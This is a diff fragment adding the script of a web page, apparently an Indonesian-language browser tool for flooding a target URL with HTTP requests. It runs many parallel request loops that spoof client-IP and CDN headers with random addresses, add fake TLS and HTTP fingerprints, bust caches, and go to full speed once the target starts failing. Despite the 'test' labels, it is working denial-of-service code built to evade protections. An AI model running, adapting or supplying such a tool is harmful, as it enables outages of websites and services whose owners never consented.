+            'X-Requested-With': 'XMLHttpRequest',
+            'Service-Worker-Navigation-Preload': 'true',
+            //'Fastly-Client-IP': `${randomIP}, ${bibib}`,
+            'Fastly-Client-IP': dynamicUrl,
+            'Fastly-FF': Math.random().toString(36).substring(2, 15),
+            'Fastly-SSL': '1',
+            'Fastly-Temp-Proxy': '1',
+            'X-Fastly-Event-ID': Math.random().toString(36).substring(2, 10),
+        };
+    }
+
+    async function resolveTargetIP(targetUrl) {
+        try {
+            document.getElementById('target-ip').innerText = "Resolving...";
+            const urlObj = new URL(targetUrl);
+            const hostname = urlObj.hostname;
+            const res = await fetch(`https://dns.google/resolve?name=${hostname}&type=A`, {
+            mode: 'cors'
+        });
+            const data = await res.json();
+            if (data.Answer && data.Answer.length > 0) {
+                document.getElementById('target-ip').innerText = data.Answer[0].data;
+            } else {
+                document.getElementById('target-ip').innerText = "IP Tidak Ditemukan";
+            }
+        } catch (e) {
+            document.getElementById('target-ip').innerText = "Gagal Resolve IP";
+        }
+    }
+
+    function updateStatusCodesUI() {
+        const container = document.getElementById('http-statuses');
+        if (Object.keys(statusCodes).length === 0) {
+            container.innerHTML = '-';
+            return;
+        }
+        let html = '';
+        for (const [code, count] of Object.entries(statusCodes)) {
+            let color = '#3fb950';
+            const codeStr = String(code);
+            if (codeStr.startsWith('3')) color = '#e3b341';
+            else if (codeStr.startsWith('4')) color = '#f85149';
+            else if (codeStr.startsWith('5')) color = '#da3633';
+            else if (codeStr === 'CORS Blocked') color = '#d2a8ff';
+            html += `<span class="status-badge" style="color: ${color}; border: 1px solid ${color};">${code}: ${count}</span>`;
+        }
+        container.innerHTML = html;
+    }
+
+    function updateGagalUI() {
+        const totalGagal = timeoutCount + corsErrors + localErrors;
+        document.getElementById('req-gagal').innerText = totalGagal.toLocaleString();
+    }
+    async function sendRequest(url) {
+        if (!isRunning || Date.now() > stopTime) return;
+
+        const proxyUrl = document.getElementById('proxy').value;
+        const finalUrl = proxyUrl ? proxyUrl + url : url;
+        const payload = generateBypassPayload(); // Ambil payload acak
+        const encodedPayload = btoa(payload).substring(0, 16); // Encode ke Base64 agar aman di URL
+        const bypassParam = `&data=${encodeURIComponent(payload)}&hash=${encodedPayload}`;
+        const cacheBuster = `?ver=${Math.floor(Math.random() * 999999)}&s=${Math.random().toString(36).substring(2)}`;
+        const dynamicUrl = finalUrl + cacheBuster + bypassParam + (finalUrl.includes('?') ? '&' : '?') + 'cb=' + Math.random().toString(36).substring(7);
+        const randomLang = language_header[Math.floor(Math.random() * language_header.length)];
+        const randomCH = cache_header[Math.floor(Math.random() * cache_header.length)];
+        const randomMenerima = menerima[Math.floor(Math.random() * menerima.length)];
+        const randomEncoding = encoding[Math.floor(Math.random() * encoding.length)];
+        const randomReferer = referrers[Math.floor(Math.random() * referrers.length)];
+        const nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
+        const nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
+        const nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
+        const nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
+        const nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
+        const nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
+        const kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
+        const countries = ['USA', 'Germany', 'Japan', 'Brazil', 'Indonesia', 'France', 'Russia', 'UK', 'China', 'India', 'Australia', 'Canada', 'Singapore', 'Netherlands', 'SouthKorea'];
+        const country = countries[Math.floor(Math.random() * countries.length)];
+        const randomIP = generateRandomIPForCountry(country);
+        const bibib = generateValidPublicIP();
+        const pilih = proxyUrl ? kuntul[3] : kuntul[2];
+        
+        document.getElementById('fetch_mode_ui').innerText = pilih;
+
+        if (isRunning) {
+            requestCount++;
+            document.getElementById('total-req').innerText = requestCount.toLocaleString();
+        }
+
+        try {
+            const controller = new AbortController();
+            const timeoutValue = parseInt(document.getElementById('timeout-ms').value) || 1000;
+            const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
+            const http2Fingerprint = JSON.stringify(generateHTTP2Fingerprint());
+            const http3Fingerprint = generateHTTP3Fingerprint();
+            const h4Fingerprint = generateHTTP4Fingerprint();
+            const customALPN = generateALPN().join(', ');
+            const ja3Fingerprint = JSON.stringify(generateJA3Fingerprint());
+
+            const headers = { 'Accept-Language' : randomLang };
+            
+            if (!proxyUrl) { 
+                headers['X-JA3-Fingerprint'] = ja3Fingerprint;
+                headers['X-HTTP2-Fingerprint'] = http2Fingerprint;
+                headers['X-HTTP3-Fingerprint'] = http3Fingerprint;
+                headers['X-HTTP4-Experimental'] = h4Fingerprint;
+                //headers['X-QUIC-ALPN'] = customALPN;
+				headers['X-QUIC-ALPN'] = customALPN.includes('h2') ? customALPN : 'h2, ' + customALPN;
+                headers['X-PQ-Key-Exchange'] = generateQuantumEntropy();
+                headers['Accept-Encoding'] = randomEncoding;
+                headers['Accept'] = randomMenerima;
+				        headers['X-XSS-Protection'] = '1; mode=block';
+                headers['X-Payload-Bypass'] = payload;
+                headers['X-Custom-Payload'] = encodedPayload;
+                headers['X-Real-IP'] = randomIP;
+                headers['CF-Connecting-IP'] = bibib;
+                headers['X-BB-IP'] = bibib;
+                headers['X-LS-IP'] = bibib;
+                headers['True-Client-IP'] = randomIP;
+                headers['X-Forwarded-For'] = `${randomIP}, ${bibib}`;
+                headers['X-Forwarded-Host'] = new URL(url).hostname;
+                headers['X-Host'] = new URL(url).hostname;
+                headers['Client-IP'] = bibib;
+                headers['X-Originating-IP'] = randomIP;
+                headers['X-Remote-IP'] = bibib;
+                headers['Fastly-Client-IP'] = `${randomIP}, ${bibib}`;
+                headers['User-Agent'] = "Mozilla/5.0 (Experimental H4;" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4;
+            }
+
+            if (requestCount % 5 === 0) {
+                headers['X-HTTP-Method-Override'] = 'GET';
+            }
+            if (requestCount % 10 === 0) {
+            document.getElementById('fetch_mode_uih4').innerText = "H4/QUIC-Bypass";
+            document.getElementById('fetch_mode_uih4').style.color = "#d2a8ff";
+        }
+            const response = await fetch(dynamicUrl, {
+                method: 'GET',
+                cache: 'no-store', 
+                mode: pilih,
+                keepalive: true,
+                headers: headers,
+                referrer: referrers[Math.floor(Math.random() * referrers.length)],
+                signal: controller.signal
+            });
+
+            clearTimeout(timeoutId);
+
+            if (isRunning) {
+                originHits++;
+                const status = response.status;
+                statusCodes[status] = (statusCodes[status] || 0) + 1;
+
+                document.getElementById('origin-hits').innerText = originHits.toLocaleString();
+                document.getElementById('req-terkirim').innerText = originHits.toLocaleString();
+                updateStatusCodesUI();
+            }
+        } catch (e) {
+            const isIgnoredName = ignoreNames.includes(e.name);
+            const isIgnoredCode = e.code && ignoreCodes.includes(e.code);
+
+            if (isIgnoredName || isIgnoredCode) {
+                console.warn(`Ignored Error: ${e.name} - ${e.code || 'No Code'}`);
+            } else {
+                if (e.name === 'AbortError') {
+                    if (isRunning) {
+                        timeoutCount++;
+                        document.getElementById('timeouts').innerText = timeoutCount.toLocaleString();
+                        updateGagalUI();
+                    }
+                } else if (e.name === 'TypeError') {
+                    if (!navigator.onLine) {
+                        if (isRunning) {
+                            localErrors++;
+                            document.getElementById('local-errors').innerText = localErrors.toLocaleString();
+                            updateGagalUI();
+                        }
+                    } else {
+                        if (isRunning) {
+                            corsErrors++;
+                            document.getElementById('cors-errors').innerText = corsErrors.toLocaleString();
+                            statusCodes['CORS Blocked'] = (statusCodes['CORS Blocked'] || 0) + 1;
+                            updateStatusCodesUI();
+                            updateGagalUI();
+                        }
+                    }
+                } else {
+                    if (isRunning) {
+                        localErrors++;
+                        document.getElementById('local-errors').innerText = localErrors.toLocaleString();
+                        updateGagalUI();
+                    }
+                }
+            }
+        }
+
+        if (isRunning) {
+            let baseDelay = 15; 
+            const isTargetWeak = (statusCodes[500] || 0) > 5 || (statusCodes[502] || 0) > 5 || (statusCodes[503] || 0) > 5 || (statusCodes[504] || 0) > 5 || timeoutCount > 20;
+            const isHighTrafficSuccess = (statusCodes[200] || 0) > 100;
+            const beingRateLimited = (statusCodes[429] || 0) > 5 || (statusCodes[403] || 0) > 10;
+            let boosterFactor = 1;
+
+            if (isTargetWeak || isHighTrafficSuccess) {
+                baseDelay = 0; 
+                boosterFactor = 0.5;
+                document.getElementById('booster-status').innerText = "ACTIVE (MAX)";
+                document.getElementById('booster-status').style.color = "#3fb950";
+            } else if (beingRateLimited) {
+                baseDelay = Math.floor(Math.random() * 100) + 50;
+                document.getElementById('booster-status').innerText = "Throttling (4xx)";
+                document.getElementById('booster-status').style.color = "#f85149";
+            } else {
+                baseDelay = 15;
+                boosterFactor = 1;
+                document.getElementById('booster-status').innerText = "Warm-up";
+                document.getElementById('booster-status').style.color = "#58a6ff";
+            }
+            
+            const finalJitter = Math.floor(Math.random() * (15 * boosterFactor)) + baseDelay;
+            setTimeout(() => {
+                if (isRunning) sendRequest(url);
+            }, finalJitter);
+        }
+    }
+
+    function startTest() {
+        const targetUrl = document.getElementById('url').value;
+        const duration = parseInt(document.getElementById('duration').value);
+        const threads = parseInt(document.getElementById('threads').value);
+
+        if (!targetUrl.startsWith('http')) {
+            alert('Masukkan URL yang valid (harus memakai http:// atau https://)');
+            resetSlider();
+            return;
+        }
+
+        isRunning = true;
+        requestCount = 0;
+        originHits = 0;
+        timeoutCount = 0;
+        corsErrors = 0;
+        localErrors = 0;
+        statusCodes = {};
+        stopTime = Date.now() + (duration * 1000);
+        
+        document.querySelector('.container').classList.add('running');
+        document.getElementById('slider-wrapper').style.display = 'none';
+        document.getElementById('stop-btn').style.display = 'block';
+        document.getElementById('status').innerText = 'Running...';
+        document.getElementById('status').style.color = '#3fb950';
+        document.getElementById('total-req').innerText = '0';
+        document.getElementById('origin-hits').innerText = '0';
+        document.getElementById('timeouts').innerText = '0';
+        document.getElementById('cors-errors').innerText = '0';
+        document.getElementById('local-errors').innerText = '0';
+        document.getElementById('req-terkirim').innerText = '0';
+        document.getElementById('req-gagal').innerText = '0';
+
+        updateStatusCodesUI();
+        resolveTargetIP(targetUrl);
+        dashboardInterval = showDashboard();
+        for (let i = 0; i < threads; i++) {
+            sendRequest(targetUrl);
+        }
+
+        const startTime = Date.now();
+        const timerInterval = setInterval(() => {
+            const now = Date.now();
+            const elapsed = now - startTime;
+            const remaining = Math.max(0, Math.ceil((stopTime - now) / 1000));
+            const progress = (elapsed / (duration * 1000)) * 100;
+
+            document.getElementById('timer').innerText = remaining + 's';
+            document.getElementById('progress-bar').style.width = Math.min(progress, 100) + '%';
+
+            if (now > stopTime || !isRunning) {
+                clearInterval(timerInterval);
+                stopTest();
+            }
+        }, 100);
+    }
+
+    function stopTest() {
+        isRunning = false;
+        clearInterval(dashboardInterval);
+        document.querySelector('.container').classList.remove('running');
+        document.getElementById('slider-wrapper').style.display = 'block';
+        document.getElementById('stop-btn').style.display = 'none';
+        document.getElementById('status').innerText = 'Finished';
+        document.getElementById('status').style.color = '#c9d1d9';
+        resetSlider();
+    }
+
+    const thumb = document.getElementById('slider-thumb');
+    const sliderContainer = document.querySelector('.slider-container');
+    const sliderText = document.querySelector('.slider-text');
+    let isDragging = false;
+    let startX = 0;
+
+    thumb.addEventListener('mousedown', startDrag);
+    window.addEventListener('mousemove', drag);
+    window.addEventListener('mouseup', endDrag);
+
+    thumb.addEventListener('touchstart', (e) => startDrag(e.touches[0]));
+    window.addEventListener('touchmove', (e) => drag(e.touches[0]));
+    window.addEventListener('touchend', endDrag);
+
+    function startDrag(e) {
+        if (isRunning) return;
+        isDragging = true;
+        startX = e.clientX;
+        thumb.style.transition = 'none';
+    }
+
+    function drag(e) {
+        if (!isDragging) return;
+        const maxDelta = sliderContainer.offsetWidth - thumb.offsetWidth - 10;
+        let delta = e.clientX - startX;
+        if (delta < 0) delta = 0;
+        if (delta > maxDelta) delta = maxDelta;
+        
+        thumb.style.transform = `translateX(${delta}px)`;
+        sliderText.style.opacity = 1 - (delta / maxDelta);
+    }
+
+    function endDrag() {
+        if (!isDragging) return;
+        isDragging = false;
+        const maxDelta = sliderContainer.offsetWidth - thumb.offsetWidth - 10;
+        const currentDelta = new WebKitCSSMatrix(getComputedStyle(thumb).transform).m41;
+
+        if (currentDelta >= maxDelta - 5) {
+            thumb.style.transform = `translateX(${maxDelta}px)`;
+            startTest();
+        } else {
+            resetSlider();
+        }
+    }
+
+    function resetSlider() {
+        thumb.style.transition = 'transform 0.3s ease-out';
+        thumb.style.transform = `translateX(0px)`;
+        sliderText.style.opacity = 1;
+    }
+</script>
+</body>
+</html>
